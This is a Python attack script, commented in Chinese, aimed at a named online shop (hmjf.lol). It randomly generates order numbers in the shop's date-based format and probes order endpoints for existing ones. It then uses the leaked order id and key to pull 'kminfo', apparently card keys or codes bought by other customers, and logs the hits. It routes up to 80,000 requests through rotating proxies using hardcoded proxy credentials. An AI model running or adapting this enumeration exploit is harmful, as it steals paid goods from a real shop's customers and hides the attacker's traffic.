#!/usr/bin/env python3
"""随机 trade_no 采样找已存在订单（比按秒全扫现实得多）"""
import json, os, random, re, subprocess, time
from datetime import datetime, timedelta

OUT = os.environ.get("HMJF_OUT", "/data/automation/results/hmjf.lol/kami_mine_20260716")
ENV = "/data/config/proxy.env"
FETCH = "/data/automation/bin/qg-proxy-fetch.sh"
BASE = "https://hmjf.lol/shop"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
REF = "https://hmjf.lol/shop/"
os.makedirs(OUT, exist_ok=True)
CK = f"{OUT}/.cookies"
FOUND = f"{OUT}/paid_found.jsonl"
LOG = open(f"{OUT}/random_sample.log", "a", buffering=1)
N = 0

def log(m):
    print(m, flush=True)
    LOG.write(m + "\n")

def px():
    for l in open(ENV):
        if l.startswith("PROXY_URL="):
            return l.split("=", 1)[1].strip().strip('"')
    return ""

PX = px()

def refresh():
    global PX
    subprocess.run(["bash", FETCH], capture_output=True,
                   env={**os.environ, "QG_AUTHKEY": "02E76F93", "QG_AUTHPWD": "A0FFB679553D"})
    PX = px()
    time.sleep(1)

def curl(url, post=None):
    global N, PX
    for attempt in range(3):
        N += 1
        if N % 100 == 0:
            refresh()
        cmd = ["curl", "-s", "--max-time", "10", "-x", PX, "-A", UA, "-H", f"Referer: {REF}",
               "-b", CK, "-c", CK, "-k"]
        if post:
            cmd += ["-X", "POST", "-d", post, "-H", "Content-Type: application/x-www-form-urlencoded"]
        cmd.append(url)
        raw = subprocess.run(cmd, capture_output=True, text=True, timeout=14).stdout or ""
        if raw.strip():
            return raw
        refresh()
        time.sleep(0.5)
    return raw

def rand_tn():
    start = datetime(2025, 11, 1)
    days = random.randint(0, 258)
    d = start + timedelta(days=days)
    h, m, s = random.randint(0, 23), random.randint(0, 59), random.randint(0, 59)
    suf = random.randint(0, 999)
    return f"{d.strftime('%Y%m%d')}{h:02d}{m:02d}{s:02d}{suf:03d}"

def check(tn):
    sub = curl(f"{BASE}/other/submit.php?type=alipay&orderid={tn}")
    if not sub.strip():
        return None
    if "该订单号不存在" in sub:
        return None
    if "window.location" not in sub and "location.href" not in sub:
        return None
    gs = curl(f"{BASE}/other/getshop.php?trade_no={tn}")
    qh = curl(f"{BASE}/?mod=query&data={tn}")
    show = re.search(r"showOrder\s*\(\s*(\d+)\s*,\s*'([a-f0-9]{32})'", qh)
    paid = "未付款" not in gs
    kminfo = None
    try:
        j = json.loads(gs)
        paid = bool(j.get("kminfo")) or j.get("msg") != "未付款"
        kminfo = j.get("kminfo")
    except Exception:
        pass
    oid, sk = (show.group(1), show.group(2)) if show else (None, None)
    if oid and sk:
        oh = curl(f"{BASE}/ajax.php?act=order", f"id={oid}&skey={sk}")
        try:
            oj = json.loads(oh)
            if oj.get("kminfo"):
                kminfo = oj["kminfo"]
                paid = True
        except Exception:
            pass
    rec = {"trade_no": tn, "paid": paid, "kminfo": kminfo, "id": oid, "skey": sk, "getshop": gs[:180]}
    with open(FOUND, "a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    tag = "PAID" if paid or kminfo else "EXIST"
    log(f"*** {tag} {tn} paid={paid} kminfo={bool(kminfo)} id={oid}")
    if kminfo:
        with open(f"{OUT}/paid_hits.json", "a") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    return rec

def main():
    curl(BASE + "/")  # init cookies
    trials = int(os.environ.get("RANDOM_TRIALS", "80000"))
    log(f"[start] trials={trials} {datetime.now().isoformat()}")
    hits = 0
    for i in range(1, trials + 1):
        tn = rand_tn()
        r = check(tn)
        if r:
            hits += 1
        if i % 500 == 0:
            log(f"  progress {i}/{trials} hits={hits} req={N}")
        time.sleep(0.05)
    log(f"[done] hits={hits} req={N}")
    LOG.close()

if __name__ == "__main__":
    main()
